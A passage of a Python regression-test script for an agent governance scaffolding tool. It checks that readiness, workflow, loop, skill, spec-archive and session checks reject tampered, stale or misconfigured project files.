        print(self_asserted.stdout + self_asserted.stderr, file=sys.stderr)
        raise SystemExit(1)
    for lane_name, lane in lanes.items():
        if lane.get("required") is True:
            run([python, "scripts/agent_frontend.py", "run-lane", lane_name], cwd=web)
    run([python, "scripts/agent_frontend.py", "run-browser"], cwd=web)
    run([python, "scripts/agent_frontend.py", "readiness"], cwd=web)

    receipt_path = browser_path.with_name(browser_path.name + ".receipt.json")
    valid_browser = browser_path.read_text(encoding="utf-8")
    valid_receipt = receipt_path.read_text(encoding="utf-8")
    browser_record = json.loads(valid_browser)
    browser_record["runtime"]["console_errors"] = 1
    browser_path.write_text(json.dumps(browser_record, indent=2) + "\n", encoding="utf-8")
    tampered = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "hash does not match" not in (tampered.stdout + tampered.stderr):
        print("frontend readiness accepted tampered browser evidence", file=sys.stderr)
        raise SystemExit(1)
    browser_path.write_text(valid_browser, encoding="utf-8")
    receipt = json.loads(valid_receipt)
    receipt["run_id"] = "mismatched-run-id"
    receipt_path.write_text(json.dumps(receipt, indent=2) + "\n", encoding="utf-8")
    mismatched_run = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "run_id does not match" not in (mismatched_run.stdout + mismatched_run.stderr):
        print("frontend readiness accepted a mismatched browser run id", file=sys.stderr)
        raise SystemExit(1)
    receipt_path.write_text(valid_receipt, encoding="utf-8")
    frontend["browser_evidence"]["command"] = fixture_command + " --changed"
    frontend_path.write_text(json.dumps(frontend, indent=2) + "\n", encoding="utf-8")
    mismatched_command = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "browser receipt command" not in (mismatched_command.stdout + mismatched_command.stderr):
        print("frontend readiness accepted browser evidence for another command", file=sys.stderr)
        raise SystemExit(1)
    frontend["browser_evidence"]["command"] = fixture_command
    frontend_path.write_text(json.dumps(frontend, indent=2) + "\n", encoding="utf-8")
    receipt = json.loads(valid_receipt)
    receipt["completed_at"] = "2000-01-01T00:00:00Z"
    receipt_path.write_text(json.dumps(receipt, indent=2) + "\n", encoding="utf-8")
    stale = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "older than" not in (stale.stdout + stale.stderr):
        print("frontend readiness accepted stale browser evidence", file=sys.stderr)
        raise SystemExit(1)
    receipt_path.write_text(valid_receipt, encoding="utf-8")
    run([python, "scripts/agent_frontend.py", "readiness"], cwd=web)
    malformed_browser = json.loads(valid_browser)
    malformed_browser["viewports"] = [{"invalid": True}]
    browser_path.write_text(json.dumps(malformed_browser, indent=2) + "\n", encoding="utf-8")
    malformed_receipt = json.loads(valid_receipt)
    malformed_receipt["evidence_sha256"] = hashlib.sha256(browser_path.read_bytes()).hexdigest()
    receipt_path.write_text(json.dumps(malformed_receipt, indent=2) + "\n", encoding="utf-8")
    malformed_evidence = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    malformed_output = malformed_evidence.stdout + malformed_evidence.stderr
    if "viewports must be a list of non-empty strings" not in malformed_output or "Traceback" in malformed_output:
        print("frontend readiness did not fail cleanly for malformed browser viewport evidence", file=sys.stderr)
        print(malformed_output, file=sys.stderr)
        raise SystemExit(1)
    browser_path.write_text(valid_browser, encoding="utf-8")
    receipt_path.write_text(valid_receipt, encoding="utf-8")
    external_receipt = temp_root / "external-browser-receipt.json"
    external_receipt.write_text(valid_receipt, encoding="utf-8")
    receipt_path.unlink()
    try:
        receipt_path.symlink_to(external_receipt)
    except OSError:
        pass
    else:
        escaped_receipt = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
        escaped_output = escaped_receipt.stdout + escaped_receipt.stderr
        if "receipt escapes the repository" not in escaped_output or "Traceback" in escaped_output:
            print("frontend readiness did not reject an external receipt symlink cleanly", file=sys.stderr)
            print(escaped_output, file=sys.stderr)
            raise SystemExit(1)
        receipt_path.unlink()
    receipt_path.write_text(valid_receipt, encoding="utf-8")

    unqualified_next_intake = temp_root / "frontend-next-unqualified.json"
    unqualified_next_intake.write_text(json.dumps({"frontend": {"enabled": True, "framework": "nextjs"}}) + "\n", encoding="utf-8")
    unqualified_next = temp_root / "frontend-next-unqualified"
    unqualified_next.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(unqualified_next), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(unqualified_next_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    unqualified = json.loads((unqualified_next / ".agent" / "frontend.json").read_text(encoding="utf-8"))
    if unqualified.get("stack_decision", {}).get("selection_status") != "needs-confirmation":
        print("unqualified Next.js intake was treated as confirmed", file=sys.stderr)
        raise SystemExit(1)

    for name, extra in (
        ("arbitrary-qualifier", {"nextjs_qualifying_requirements": ["totally-arbitrary"]}),
        ("rationale-only", {"rationale": "personal preference"}),
    ):
        intake_path = temp_root / f"frontend-next-{name}.json"
        intake_path.write_text(
            json.dumps({"frontend": {"enabled": True, "framework": "nextjs", "confirmed": True, **extra}}) + "\n",
            encoding="utf-8",
        )
        target = temp_root / f"frontend-next-{name}"
        target.mkdir(parents=True, exist_ok=True)
        run([python, str(INIT_SCRIPT), str(target), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(intake_path), "--no-makefile"], cwd=PACKAGE_ROOT)
        decision = json.loads((target / ".agent" / "frontend.json").read_text(encoding="utf-8"))["stack_decision"]
        if decision.get("selection_status") != "needs-confirmation":
            print(f"Next.js {name} bypass was treated as confirmed", file=sys.stderr)
            raise SystemExit(1)

    exception_target = temp_root / "frontend-next-reviewed-exception"
    (exception_target / "docs").mkdir(parents=True, exist_ok=True)
    (exception_target / "docs" / "nextjs-review.md").write_text("Reviewed exception.\n", encoding="utf-8")
    exception_intake = temp_root / "frontend-next-reviewed-exception.json"
    exception_intake.write_text(
        json.dumps({"frontend": {"enabled": True, "framework": "nextjs", "confirmed": True, "nextjs_reviewed_exception": {"rationale": "Platform integration requirement.", "owner": "frontend-owner", "review_evidence": "docs/nextjs-review.md"}}}) + "\n",
        encoding="utf-8",
    )
    run([python, str(INIT_SCRIPT), str(exception_target), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(exception_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    exception_decision = json.loads((exception_target / ".agent" / "frontend.json").read_text(encoding="utf-8"))["stack_decision"]
    if exception_decision.get("selection_status") != "confirmed":
        print("reviewed Next.js exception did not confirm the framework", file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_frontend.py", "doctor"], cwd=exception_target)

    qualified_next_intake = temp_root / "frontend-next-qualified.json"
    qualified_next_intake.write_text(
        json.dumps({"frontend": {"enabled": True, "framework": "nextjs", "confirmed": True, "nextjs_qualifying_requirements": ["SSR"], "deployment_boundary": "project-owned Node runtime"}}) + "\n",
        encoding="utf-8",
    )
    qualified_next = temp_root / "frontend-next-qualified"
    qualified_next.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(qualified_next), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(qualified_next_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    qualified = json.loads((qualified_next / ".agent" / "frontend.json").read_text(encoding="utf-8"))
    if qualified.get("stack_decision", {}).get("profile") != "nextjs-framework" or qualified.get("stack_decision", {}).get("selection_status") != "confirmed":
        print("qualified Next.js intake did not select the framework profile", file=sys.stderr)
        raise SystemExit(1)

    unconfirmed_echarts_intake = temp_root / "frontend-echarts-unconfirmed.json"
    unconfirmed_echarts_intake.write_text(json.dumps({"frontend": {"enabled": True, "confirmed": True, "visualization_enabled": True, "visualization_engine": "echarts", "visualization_confirmed": False}}) + "\n", encoding="utf-8")
    unconfirmed_echarts_target = temp_root / "frontend-echarts-unconfirmed"
    unconfirmed_echarts_target.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(unconfirmed_echarts_target), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(unconfirmed_echarts_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    unconfirmed_visualization = json.loads((unconfirmed_echarts_target / ".agent" / "frontend.json").read_text(encoding="utf-8"))["visualization"]
    if unconfirmed_visualization.get("selection_status") == "confirmed":
        print("visualization_confirmed=false still confirmed ECharts", file=sys.stderr)
        raise SystemExit(1)

    echarts_intake = temp_root / "frontend-echarts.json"
    echarts_intake.write_text(json.dumps({"frontend": {"enabled": True, "confirmed": True, "visualization_enabled": True, "visualization_engine": "echarts", "visualization_confirmed": True}}) + "\n", encoding="utf-8")
    echarts_target = temp_root / "frontend-echarts"
    echarts_target.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(echarts_target), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(echarts_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    echarts = json.loads((echarts_target / ".agent" / "frontend.json").read_text(encoding="utf-8")).get("visualization", {}).get("echarts", {})
    for key in ("modular_imports", "stable_dimensions", "resize_handling", "dispose_on_unmount", "aria_registration_and_enablement", "text_or_table_alternative", "non_color_encoding"):
        if echarts.get(key) is not True:
            print(f"ECharts governance missing {key}", file=sys.stderr)
            raise SystemExit(1)
    run([python, "scripts/agent_frontend.py", "doctor"], cwd=echarts_target)
    assert_malformed_json_finding(
        echarts_target,
        ".agent/frontend.json",
        lambda data: data["visualization"]["echarts"].__setitem__("required_states", {}),
        "visualization.echarts.required_states must be a list",
    )
    canvas_path = echarts_target / ".agent" / "frontend.json"
    canvas_policy = json.loads(canvas_path.read_text(encoding="utf-8"))
    canvas_policy["visualization"]["echarts"]["renderer"] = "canvas"
    canvas_path.write_text(json.dumps(canvas_policy, indent=2) + "\n", encoding="utf-8")
    canvas_missing = run([python, "scripts/agent_frontend.py", "doctor"], cwd=echarts_target, expect_ok=False)
    if "renderer_evidence" not in (canvas_missing.stdout + canvas_missing.stderr):
        print("frontend doctor accepted Canvas without measured renderer evidence", file=sys.stderr)
        raise SystemExit(1)

    for framework, package_name, version, lockfile, manager in (
        ("vue", "vue", "^3.5.0", "pnpm-lock.yaml", "pnpm"),
        ("react", "react", "^19.0.0", "yarn.lock", "yarn"),
        ("nextjs", "next", "^15.0.0", "package-lock.json", "npm"),
    ):
        existing = temp_root / f"frontend-existing-{framework}"
        existing.mkdir(parents=True, exist_ok=True)
        dependencies = {package_name: version}
        if framework == "vue":
            dependencies["echarts"] = "^6.0.0"
        (existing / "package.json").write_text(json.dumps({"packageManager": f"{manager}@10.0.0", "dependencies": dependencies}, indent=2) + "\n", encoding="utf-8")
        (existing / lockfile).write_text("existing-lockfile\n", encoding="utf-8")
        original_package = (existing / "package.json").read_bytes()
        original_lockfile = (existing / lockfile).read_bytes()
        run([python, str(INIT_SCRIPT), str(existing), "--layout", "existing", "--governance-profile", "standard", "--no-create-layout", "--no-makefile"], cwd=PACKAGE_ROOT)
        policy = json.loads((existing / ".agent" / "frontend.json").read_text(encoding="utf-8"))
        evidence = policy.get("existing_evidence", {})
        if policy.get("stack_decision", {}).get("framework") != framework or evidence.get("lockfile") != lockfile or evidence.get("package_manager") != manager:
            print(f"existing {framework} stack or lockfile was not preserved", file=sys.stderr)
            raise SystemExit(1)
        if (existing / "package.json").read_bytes() != original_package or (existing / lockfile).read_bytes() != original_lockfile:
            print(f"existing {framework} manifest or lockfile was modified", file=sys.stderr)
            raise SystemExit(1)
        if framework == "vue" and policy.get("visualization", {}).get("selection_status") != "preserved-existing":
            print("existing ECharts selection was not preserved", file=sys.stderr)
            raise SystemExit(1)
        for marker in install_markers:
            if marker != lockfile and (existing / marker).exists():
                print(f"existing {framework} initialization unexpectedly installed dependencies: {marker}", file=sys.stderr)
                raise SystemExit(1)


def assert_workflow_stage_closure(target: Path) -> None:
    workflow_path = target / ".agent" / "workflow.json"
    profiles_path = target / ".agent" / "workflow-profiles.json"
    if not workflow_path.exists() or not profiles_path.exists():
        return
    workflow = json.loads(workflow_path.read_text(encoding="utf-8"))
    profiles = json.loads(profiles_path.read_text(encoding="utf-8"))
    config_path = target / ".agent" / "config.json"
    config = json.loads(config_path.read_text(encoding="utf-8")) if config_path.exists() else {}
    governance_profile = config.get("governance_profile", "standard")
    workflow_stages = set(workflow.get("stages", []))
    gates = workflow.get("gates", {})
    goal_refinement = gates.get("goal_refinement", {})
    technology_stack = gates.get("technology_stack_intake", {})
    task_decomposition = gates.get("task_decomposition", {})
    stage_loop = gates.get("stage_review_loop", {})
    review_fix = gates.get("review_fix_gate", {})
    completion = gates.get("completion_verification", {})
    for stage in ("goal_refinement", "task_decomposition"):
        if stage not in workflow_stages or stage not in workflow.get("stage_definitions", {}):
            print(f"workflow is missing autonomous stage: {stage}", file=sys.stderr)
            raise SystemExit(1)
    if goal_refinement.get("preserve_raw_user_goal") is not True or goal_refinement.get("write_refined_goal_before_durable_goal") is not True:
        print("goal_refinement gate does not preserve and refine user goals", file=sys.stderr)
        raise SystemExit(1)
    if set(goal_refinement.get("required_for_profiles", [])) != {"bugfix", "standard", "full"}:
        print("goal_refinement gate does not apply to bugfix/standard/full profiles", file=sys.stderr)
        raise SystemExit(1)
    for key in ("ask_one_question_at_a_time", "provide_recommended_answer_and_reason", "do_not_rely_on_transient_chat"):
        if technology_stack.get(key) is not True:
            print(f"technology_stack_intake does not enforce {key}", file=sys.stderr)
            raise SystemExit(1)
    if set(task_decomposition.get("required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
        print("task_decomposition gate does not apply to all profiles", file=sys.stderr)
        raise SystemExit(1)
    if set(stage_loop.get("required_for_profiles", [])) != {"standard", "full"}:
        print("stage_review_loop does not apply to standard/full profiles", file=sys.stderr)
        raise SystemExit(1)
    if stage_loop.get("loop") != ["review", "fix", "re_review"]:
        print("stage_review_loop does not require review-fix-re_review", file=sys.stderr)
        raise SystemExit(1)
    if review_fix.get("applies_to_stage_review_loop") is not True:
        print("review_fix_gate is not tied to stage review loops", file=sys.stderr)
        raise SystemExit(1)
    if completion.get("completed_spec_changes_must_be_archived") is not True:
        print("completion gate does not require completed spec changes to be archived", file=sys.stderr)
        raise SystemExit(1)
    if set(completion.get("review_fix_gate_required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
        print("completion gate does not require review-fix for all profiles", file=sys.stderr)
        raise SystemExit(1)
    task_board_path = target / ".agent" / "task-board.json"
    if task_board_path.exists():
        task_board = json.loads(task_board_path.read_text(encoding="utf-8"))
        policy = task_board.get("policy", {})
        if set(policy.get("done_requires_review_gate_pass_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
            print("task board does not require done review gates for all profiles", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("goal_contract_required_for_profiles", [])) != {"bugfix", "standard", "full"}:
            print("task board does not require goal contracts for bugfix/standard/full", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("goal_contract_required_states", [])) != {"active", "review", "done"}:
            print("task board does not require goal contracts through done", file=sys.stderr)
            raise SystemExit(1)
        if not {"plan", "implementation", "verification", "handoff"}.issubset(set(policy.get("goal_contract_required_before_stages", []))):
            print("task board does not require goal contracts before protected implementation stages", file=sys.stderr)
            raise SystemExit(1)
        if set(policy.get("task_decomposition_required_for_profiles", [])) != {"tiny", "bugfix", "standard", "full"}:
            print("task board does not require task decomposition for all profiles", file=sys.stderr)
            raise SystemExit(1)
    if governance_profile in {"standard", "full"}:
        for relative in (".agent/intake/.gitkeep", ".agent/templates/intake-packet.md.tmpl"):
            if not (target / relative).exists():
                print(f"autonomous intake path was not generated: {relative}", file=sys.stderr)
                raise SystemExit(1)
    for name, profile in profiles.get("profiles", {}).items():
        if profile.get("review_gate_required") is not True:
            print(f"workflow profile {name} does not require a review gate", file=sys.stderr)
            raise SystemExit(1)
        for stage in ("goal_refinement", "task_decomposition"):
            if stage not in profile.get("stages", []):
                print(f"workflow profile {name} does not include {stage}", file=sys.stderr)
                raise SystemExit(1)
        for stage in profile.get("stages", []):
            if stage not in workflow_stages:
                print(f"workflow profile {name} references unknown stage: {stage}", file=sys.stderr)
                raise SystemExit(1)


def assert_loop_primitive_governance(target: Path, python: str) -> None:
    loop_path = target / ".agent" / "loop-engineering.json"
    workflow_path = target / ".agent" / "workflow.json"
    if not loop_path.exists():
        print("standard/full profile did not generate .agent/loop-engineering.json", file=sys.stderr)
        raise SystemExit(1)
    loop_config = json.loads(loop_path.read_text(encoding="utf-8"))
    workflow = json.loads(workflow_path.read_text(encoding="utf-8"))

    required_primitives = {"turn_based", "goal_based", "time_based", "scheduled_routine", "scripted_workflow"}
    selection = loop_config.get("primitive_selection", {})
    primitives = selection.get("primitives", {})
    if set(primitives) != required_primitives:
        print("loop primitive matrix did not contain the required five primitives", file=sys.stderr)
        print(json.dumps(selection, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if set(selection.get("external_polling_policy", {}).get("allowed_primitives", [])) != {"time_based", "scheduled_routine"}:
        print("external polling policy did not route to time_based/scheduled_routine", file=sys.stderr)
        raise SystemExit(1)

    source_status = {
        item.get("url"): item.get("source_status")
        for item in loop_config.get("sources", [])
        if isinstance(item, dict)
    }
    for url in (
        "https://claude.com/blog/getting-started-with-loops",
        "https://code.claude.com/docs/en/goal",
        "https://code.claude.com/docs/en/scheduled-tasks",
        "https://code.claude.com/docs/en/workflows",
    ):
        if source_status.get(url) != "verified":
            print(f"official loop source was not recorded as verified: {url}", file=sys.stderr)
            raise SystemExit(1)
    if source_status.get("https://x.com/ClaudeDevs/article/2074208949205881033") != "blocked":
        print("inaccessible X article was not recorded as blocked", file=sys.stderr)
        raise SystemExit(1)

    gate = workflow.get("gates", {}).get("loop_engineering", {})
    for key in (
        "primitive_selection_required",
        "goal_based_requires_verifiable_convergence",
        "external_polling_must_not_be_goal_only",
        "scheduled_routine_requires_disable_policy",
        "scripted_workflow_requires_pilot_and_cross_check",
        "usage_evidence_required_for_expensive_or_autonomous_loops",
        "host_native_features_optional_mappings",
    ):
        if gate.get(key) is not True:
            print(f"workflow loop_engineering gate missing {key}", file=sys.stderr)
            raise SystemExit(1)

    original_text = loop_path.read_text(encoding="utf-8")

    def expect_loop_failure(mutator, expected: str, *, use_score: bool = False) -> None:
        mutated = json.loads(original_text)
        mutator(mutated)
        loop_path.write_text(json.dumps(mutated, indent=2) + "\n", encoding="utf-8")
        try:
            if use_score:
                result = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target)
            else:
                result = run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False)
            output = result.stdout + result.stderr
            if expected not in output:
                print(f"loop primitive regression did not report expected text: {expected}", file=sys.stderr)
                print(output, file=sys.stderr)
                raise SystemExit(1)
        finally:
            loop_path.write_text(original_text, encoding="utf-8")
            run([python, "scripts/agent_check.py"], cwd=target)

    expect_loop_failure(
        lambda data: data.get("primitive_selection", {}).get("primitives", {}).pop("scripted_workflow", None),
        "scripted_workflow",
        use_score=True,
    )
    expect_loop_failure(
        lambda data: data.get("primitive_selection", {}).get("primitives", {}).get("goal_based", {}).setdefault("required_evidence", []).remove("proof_method"),
        "proof_method",
    )
    expect_loop_failure(
        lambda data: data.get("primitive_selection", {}).get("external_polling_policy", {}).update({"allowed_primitives": ["goal_based"]}),
        "external polling",
    )
    expect_loop_failure(
        lambda data: data.get("scheduled_routine", {}).setdefault("required_fields", []).remove("disable_or_expiry_policy"),
        "disable_or_expiry_policy",
    )
    expect_loop_failure(
        lambda data: data.get("scripted_workflow", {}).setdefault("required_fields", []).remove("pilot_scope"),
        "pilot_scope",
    )
    expect_loop_failure(
        lambda data: data.get("usage_evidence", {}).setdefault("fields", []).remove("token_or_cost_summary"),
        "token_or_cost_summary",
    )
    expect_loop_failure(
        lambda data: [
            item.update({"source_status": "verified"})
            for item in data.get("sources", [])
            if isinstance(item, dict) and item.get("url") == "https://x.com/ClaudeDevs/article/2074208949205881033"
        ],
        "X article",
    )


def assert_global_skill_governance(target: Path, python: str, temp_root: Path) -> None:
    global_root = temp_root / "global-skill-root"
    global_skill = global_root / "skills" / "global-only-skill"
    global_skill.mkdir(parents=True, exist_ok=True)
    (global_skill / "SKILL.md").write_text(
        """---
name: global-only-skill
description: Regression fixture for unmanaged global skill governance.
---

# Global Only Skill
""",
        encoding="utf-8",
    )
    hygiene_path = target / ".agent" / "skill-hygiene.json"
    hygiene = json.loads(hygiene_path.read_text(encoding="utf-8"))
    hygiene["scan_roots"] = [".codex/skills", str(global_root / "skills")]
    hygiene_path.write_text(json.dumps(hygiene, indent=2) + "\n", encoding="utf-8")

    report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    records = {item.get("name"): item for item in report.get("skills", [])}
    global_record = records.get("global-only-skill")
    if not global_record or global_record.get("scope") != "global" or global_record.get("global_discovered") is not True:
        print("project skill report did not include unmanaged global skill discovery", file=sys.stderr)
        print(json.dumps(report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
    if "global_unmanaged" not in (doctor.stdout + doctor.stderr):
        print("project skill doctor did not fail unmanaged global skill", file=sys.stderr)
        print(doctor.stdout + doctor.stderr, file=sys.stderr)
        raise SystemExit(1)

    shutil.rmtree(global_skill)

    project_skill = target / ".codex" / "skills" / "agent-gov"
    project_skill.mkdir(parents=True, exist_ok=True)
    (project_skill / "SKILL.md").write_text(
        """---
name: agent-gov
description: Regression fixture for project-governed agent-gov skill.
---

# Agent Gov
""",
        encoding="utf-8",
    )
    global_same_name = global_root / "skills" / "agent-gov"
    global_same_name.mkdir(parents=True, exist_ok=True)
    (global_same_name / "SKILL.md").write_text(
        """---
name: agent-gov
description: Regression fixture for same-name unmanaged global skill governance.
---

# Agent Gov Global
""",
        encoding="utf-8",
    )
    project_skills_path = target / ".agent" / "project-skills.json"
    project_skills = json.loads(project_skills_path.read_text(encoding="utf-8"))
    project_skills["skills"]["agent-gov"] = {
        "scope": "project",
        "host": "codex",
        "path": ".codex/skills/agent-gov",
        "lifecycle": "active",
        "intent": "workspace-only",
        "owner": "regression",
        "risk": "medium",
        "source": {"kind": "repo-local", "repository": "", "ref": "", "pinned": False},
        "content": {},
        "release": {"manifest": "", "publishable": False, "release_gate": "local-validation"},
        "review": {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""},
    }
    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")

    same_name_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    same_name_records = {item.get("name"): item for item in same_name_report.get("skills", [])}
    same_name_record = same_name_records.get("agent-gov")
    if not same_name_record or same_name_record.get("global_discovered") is not True:
        print("project skill report did not surface same-name global discovery", file=sys.stderr)
        print(json.dumps(same_name_report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    same_name_doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
    if "global_unmanaged" not in (same_name_doctor.stdout + same_name_doctor.stderr):
        print("project skill doctor did not fail same-name unmanaged global skill", file=sys.stderr)
        print(same_name_doctor.stdout + same_name_doctor.stderr, file=sys.stderr)
        raise SystemExit(1)

    project_skills["skills"]["agent-gov"]["global_install_path"] = str(global_same_name)
    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")
    governed_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
    governed_records = {item.get("name"): item for item in governed_report.get("skills", [])}
    governed_agent_gov = governed_records.get("agent-gov", {})
    if "global_unmanaged" in governed_agent_gov.get("statuses", []):
        print("registered same-name global skill still reported as unmanaged", file=sys.stderr)
        print(json.dumps(governed_agent_gov, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target)


def assert_spec_archive_gate(target: Path, python: str) -> None:
    run(
        [
            python,
            "scripts/agent_spec.py",
            "new-change",
            "archive-gate",
            "--summary",
            "Verify completed active changes are archived.",
            "--profile",
            "tiny",
        ],
        cwd=target,
    )
    change = target / "openspec" / "changes" / "archive-gate"
    (change / "proposal.md").write_text(
        """# Proposal: archive-gate

## Summary

Verify completed active changes cannot pass doctor.

## Goals

- Catch completed active changes.

## Non-Goals

- Change production application behavior.

## User Impact

- Agents get a hard reminder to archive completed specs.
""",
        encoding="utf-8",
    )
    (change / "design.md").write_text(
        """# Design: archive-gate

## Approach

- Use the generated spec doctor as the release gate.

## Architecture Notes

- Keep archive policy in repo-local scripts.

## Risks

- False positives are limited to completed active changes.

## Validation Strategy

- Doctor fails before archive and passes after archive.
""",
        encoding="utf-8",
    )
    (change / "tasks.md").write_text(
        """# Tasks: archive-gate

## Validation

- [x] Verify spec archive gate catches completed active changes.
""",
        encoding="utf-8",
    )
    status = json.loads(run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target).stdout)
    if status.get("state") != "all_done":
        print("archive-gate fixture did not reach all_done", file=sys.stderr)
        print(json.dumps(status, indent=2), file=sys.stderr)
        raise SystemExit(1)
    doctor = run([python, "scripts/agent_spec.py", "doctor"], cwd=target, expect_ok=False)
    doctor_text = doctor.stdout + doctor.stderr
    if "complete but still active" not in doctor_text or "archive archive-gate" not in doctor_text:
        print("agent_spec.py doctor did not reject a completed active change", file=sys.stderr)
        print(doctor_text, file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_spec.py", "archive", "archive-gate"], cwd=target)
    if change.exists():
        print("archive-gate active change still exists after archive", file=sys.stderr)
        raise SystemExit(1)
    if not list((target / "openspec" / "changes" / "archive").glob("*-archive-gate")):
        print("archive-gate was not moved into openspec/changes/archive", file=sys.stderr)
        raise SystemExit(1)
    archived_status = json.loads(run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target).stdout)
    if archived_status.get("change", {}).get("status") != "archived":
        print("agent_spec.py status did not resolve the archived change", file=sys.stderr)
        print(json.dumps(archived_status, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run(
        [
            python,
            "scripts/agent_spec.py",
            "new-change",
            "archive-gate",
            "--summary",
            "Ambiguous archive fixture.",
            "--profile",
            "tiny",
        ],
        cwd=target,
    )
    ambiguous = run([python, "scripts/agent_spec.py", "status", "--change", "archive-gate", "--json"], cwd=target, expect_ok=False)
    if "ambiguous change reference" not in (ambiguous.stdout + ambiguous.stderr):
        print("agent_spec.py status did not reject active/archive ambiguity", file=sys.stderr)
        print(ambiguous.stdout + ambiguous.stderr, file=sys.stderr)
        raise SystemExit(1)
    shutil.rmtree(change)
    run([python, "scripts/agent_spec.py", "doctor"], cwd=target)


def assert_project_review_templates_are_profile_safe(target: Path) -> None:
    for relative in (".agent/templates/project-review.md.tmpl", ".agent/templates/project-fix-log.md.tmpl"):
        path = target / relative
        if not path.exists():
            continue
        guarded_tools: set[str] = set()
        for line in path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if stripped.startswith("if [ -f ") and stripped.endswith(" ]; then"):
                guarded = stripped.removeprefix("if [ -f ").removesuffix(" ]; then").strip("\"'")
                if guarded:
                    guarded_tools.add(guarded)
                continue
            if not stripped.startswith("python3 "):
                continue
            parts = stripped.split()
            if len(parts) < 2 or not parts[1].endswith(".py"):
                continue
            if parts[1] in guarded_tools:
                continue
            tool = target / parts[1]
            if not tool.exists():
                print(f"{relative} directly invokes profile-missing tool: {parts[1]}", file=sys.stderr)
                raise SystemExit(1)


def assert_core_session_resume_is_profile_aware(target: Path, python: str) -> None:
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "core-smoke",
            "--goal",
            "Core session smoke",
        ],
        cwd=target,
    )
    index = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index.get("active_session")
    if not session_id:
        print("core session did not record an active session", file=sys.stderr)
        raise SystemExit(1)
    events_path = target / ".agent" / "sessions" / "events.jsonl"
    events = [json.loads(line) for line in events_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    if not events or events[-1].get("schema") != "agent-session-event-v1":
        print("core session did not record append-only session events", file=sys.stderr)
        raise SystemExit(1)
    text = "\n".join(
        [
            (target / ".agent" / "sessions" / session_id / "resume-prompt.md").read_text(encoding="utf-8"),
            (target / ".agent" / "sessions" / session_id / "bootstrap.md").read_text(encoding="utf-8"),
            (target / ".agent" / "sessions" / "bootstrap.md").read_text(encoding="utf-8"),
        ]
    )
    forbidden = [".agent/workflow.json", ".agent/worktrees.json", "agent_context.py", "subagent snapshots"]
    for token in forbidden:
        if token in text:
            print(f"core session resume artifacts reference profile-missing token: {token}", file=sys.stderr)
            raise SystemExit(1)


def assert_session_doctor_handles_long_git_status(temp_root: Path, python: str) -> None:
    target = temp_root / "long-git-status-session"
    target.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(target),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "core",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(["git", "init"], cwd=target)
    for index in range(95):
        (target / f"dirty-status-{index:03d}.txt").write_text(f"dirty {index}\n", encoding="utf-8")
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "long-status",
            "--goal",
            "Long git status smoke",
        ],
        cwd=target,
    )
    doctor = run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    doctor_text = doctor.stdout + doctor.stderr
    if "worktree has changes not reflected" in doctor_text:
        print("session doctor produced a false dirty-tree warning for a long git status", file=sys.stderr)
        print(doctor_text, file=sys.stderr)
        raise SystemExit(1)
    index_data = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index_data.get("active_session")
    if not session_id:
